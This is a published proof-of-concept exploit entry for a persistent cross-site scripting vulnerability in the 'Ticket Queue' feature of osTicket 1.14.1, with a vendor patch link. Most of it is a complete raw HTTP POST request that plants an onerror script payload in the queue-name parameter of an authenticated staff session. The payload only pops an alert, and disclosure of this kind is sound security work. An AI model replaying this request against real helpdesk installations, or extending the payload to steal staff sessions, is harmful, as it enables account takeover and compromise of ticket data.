@@ -1,0 +1,34 @@
+# Exploit Title: osTicket 1.14.1 - 'Ticket Queue' Persistent Cross-Site Scripting
+# Date: 2020-05-26
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://osticket.com 
+# Patch Link: https://github.com/osTicket/osTicket/commit/6c724ea3fe352d10d457d334dc054ef81917fde1
+# Version: osTicket 1.14.1 
+# Tested on: CentOS 7 (1908)
+
+
+# Vulnerability Details
+# Description :  A persistent cross-site scripting vulnerability exists within the 'Ticket Queue' functionality of osTicket.  
+# Vulnerable Parameter : queue-name 
+
+
+# POC
+# Exploit Details : The following request will create a ticket queue with an XSS payload as the queue name.
+
+
+POST /os-ticket/scp/queues.php? HTTP/1.1
+Host: TARGET
+Content-Length: 4491
+Cache-Control: max-age=0
+Origin: http://TARGET
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://TARGET/os-ticket/scp/queues.php?
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: OSTSESSID=0c1ssokv9npgmlolue4utj3l81
+Connection: close
+
+__CSRFToken__=849ba29024f9d9a894b82fafe29437ace2edc4fa&do=create&a=add&id=&queue-name=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&parent_id=0&fields%5B%5D=status__id&fields%5B%5D=status__state&fields%5B%5D=dept_id&fields%5B%5D=assignee&fields%5B%5D=topic_id&fields%5B%5D=created&fields%5B%5D=est_duedate&fields%5B%5D=duedate&250f895b1cb39a=&_field-checkboxes%5B%5D=1545030345&21128ea1697b9a%5B%5D=includes&c88a27abe7cfab%5B%5D=1&8c6a793c80594e%5B%5D=includes&27ca5f383385cb%5B%5D=includes&82094a76afc304%5B%5D=assigned&85d9edefffa2af%5B%5D=set&a504e6f17eb29c%5B%5D=set&0cc4d080a6f9c7=&3bf29b1e29f88a=&cdf4550c8c6152=&6fd24fee5b5572=&fc1676be53debd=&8097e50092c904=&6691443ad8db48%5B%5D=&a34b4283149a9c=&14e270255589aa%5B%5D=d&f5c5cacb5af509=&197e4e922ff97d%5B%5D=d&046798c3e2934b=&35fedfb3380450%5B%5D=d&0358d35fd35b18=&6e8cc954821ab8%5B%5D=d&e8d808c9daa716%5B%5D=set&ba9c3701fead0c=&d5eed7d2b6f6d6=&42861e6193e58b=&5c39f4b522d7bc=&2008591c98253e=&d37db1b3627ff7=&24fb32de6f1bb7%5B%5D=&6759a92723004c=&bad7322c569428%5B%5D=d&ed195f6bb72ac4=&dded6ab7ae5f7d%5B%5D=d&2f075fa6f1d982=&608f0a963cf3ee%5B%5D=d&1a29ab5444d543=&df9d61f18b866b%5B%5D=d&d72deaa7c372fc%5B%5D=set&76bf3342e88075=&7a259ed4ddda1b=&bb46d89a671337=&4a459564d07f4d=&8f724bccb10aa8=&cb91e9d8492749=&5b783534587f6a%5B%5D=&68dc79a3890bef=&1f25af8e5603df%5B%5D=d&28959e91fd9838=&204683549219a5%5B%5D=d&0a68d064cd567a=&d4b3a0b1aea1b8%5B%5D=d&90c9e78164a9d4=&e4b53638ab9b55%5B%5D=d&new-field=&filter=&sort_id=&columns%5B1%5D%5Bcolumn_id%5D=1&columns%5B1%5D%5Bheading%5D=Number&columns%5B1%5D%5Bwidth%5D=85&columns%5B1%5D%5Bsortable%5D=on&columns%5B2%5D%5Bcolumn_id%5D=2&columns%5B2%5D%5Bheading%5D=Created&columns%5B2%5D%5Bwidth%5D=120&columns%5B2%5D%5Bsortable%5D=on&columns%5B3%5D%5Bcolumn_id%5D=3&columns%5B3%5D%5Bheading%5D=Subject&columns%5B3%5D%5Bwidth%5D=250&columns%5B3%5D%5Bsortable%5D=on&columns%5B4%5D%5Bcolumn_id%5D=4&columns%5B4%5D%5Bheading%5D=From&columns%5B4%5D%5Bwidth%5D=150&columns%5B4%5D%5Bsortable%5D=on&columns%5B5%5D%5Bcolumn_id%5D=5&columns%5B5%5D%5Bheading%5D=Priority&columns%5B5%5D%5Bwidth%5D=120&columns%5B5%5D%5Bsortable%5D=on&columns%5B8%5D%5Bcolumn_id%5D=8&columns%5B8%5D%5Bheading%5D=Assignee&columns%5B8%5D%5Bwidth%5D=100&columns%5B8%5D%5Bsortable%5D=on&exports%5Bnumber%5D%5Bname%5D=Ticket+Number&exports%5Bnumber%5D%5Bheading%5D=Ticket+Number&exports%5Bcreated%5D%5Bname%5D=Date+Created&exports%5Bcreated%5D%5Bheading%5D=Date+Created&exports%5Bcdata__subject%5D%5Bname%5D=Subject&exports%5Bcdata__subject%5D%5Bheading%5D=Subject&exports%5Buser__name%5D%5Bname%5D=From&exports%5Buser__name%5D%5Bheading%5D=From&exports%5Buser__emails__address%5D%5Bname%5D=From+Email&exports%5Buser__emails__address%5D%5Bheading%5D=From+Email&exports%5Bcdata__priority%5D%5Bname%5D=Priority&exports%5Bcdata__priority%5D%5Bheading%5D=Priority&exports%5Bdept_id%5D%5Bname%5D=Department&exports%5Bdept_id%5D%5Bheading%5D=Department&exports%5Btopic_id%5D%5Bname%5D=Help+Topic&exports%5Btopic_id%5D%5Bheading%5D=Help+Topic&exports%5Bsource%5D%5Bname%5D=Source&exports%5Bsource%5D%5Bheading%5D=Source&exports%5Bstatus__id%5D%5Bname%5D=Current+Status&exports%5Bstatus__id%5D%5Bheading%5D=Current+Status&exports%5Blastupdate%5D%5Bname%5D=Last+Updated&exports%5Blastupdate%5D%5Bheading%5D=Last+Updated&exports%5Best_duedate%5D%5Bname%5D=SLA+Due+Date&exports%5Best_duedate%5D%5Bheading%5D=SLA+Due+Date&exports%5Bduedate%5D%5Bname%5D=Due+Date&exports%5Bduedate%5D%5Bheading%5D=Due+Date&exports%5Bclosed%5D%5Bname%5D=Closed+Date&exports%5Bclosed%5D%5Bheading%5D=Closed+Date&exports%5Bisoverdue%5D%5Bname%5D=Overdue&exports%5Bisoverdue%5D%5Bheading%5D=Overdue&exports%5Bmerged%5D%5Bname%5D=Merged&exports%5Bmerged%5D%5Bheading%5D=Merged&exports%5Blinked%5D%5Bname%5D=Linked&exports%5Blinked%5D%5Bheading%5D=Linked&exports%5Bisanswered%5D%5Bname%5D=Answered&exports%5Bisanswered%5D%5Bheading%5D=Answered&exports%5Bstaff_id%5D%5Bname%5D=Agent+Assigned&exports%5Bstaff_id%5D%5Bheading%5D=Agent+Assigned&exports%5Bteam_id%5D%5Bname%5D=Team+Assigned&exports%5Bteam_id%5D%5Bheading%5D=Team+Assigned&exports%5Bthread_count%5D%5Bname%5D=Thread+Count&exports%5Bthread_count%5D%5Bheading%5D=Thread+Count&exports%5Breopen_count%5D%5Bname%5D=Reopen+Count&exports%5Breopen_count%5D%5Bheading%5D=Reopen+Count&exports%5Battachment_count%5D%5Bname%5D=Attachment+Count&exports%5Battachment_count%5D%5Bheading%5D=Attachment+Count&exports%5Btask_count%5D%5Bname%5D=Task+Count&exports%5Btask_count%5D%5Bheading%5D=Task+Count&new-field=&submit=Create
